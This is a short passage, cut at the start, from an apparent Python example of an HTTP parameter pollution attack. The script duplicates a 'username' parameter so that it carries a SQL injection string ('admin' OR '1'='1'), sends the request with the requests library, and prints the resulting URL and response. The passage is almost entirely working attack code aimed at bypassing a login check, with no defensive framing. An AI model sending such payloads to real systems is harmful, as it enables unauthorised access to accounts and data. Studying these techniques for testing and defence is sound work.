    "username": "admin",
    "password": "password123"
}

# HPP attack by duplicating the username parameter
hpp_params = {
    "username": ["admin", "admin' OR '1'='1"],  # Second value will override in some cases
    "password": "password123"
}

# Send the request
response = requests.get(url, params=hpp_params)
print(response.url)  # Check the constructed URL
print(response.text)
```

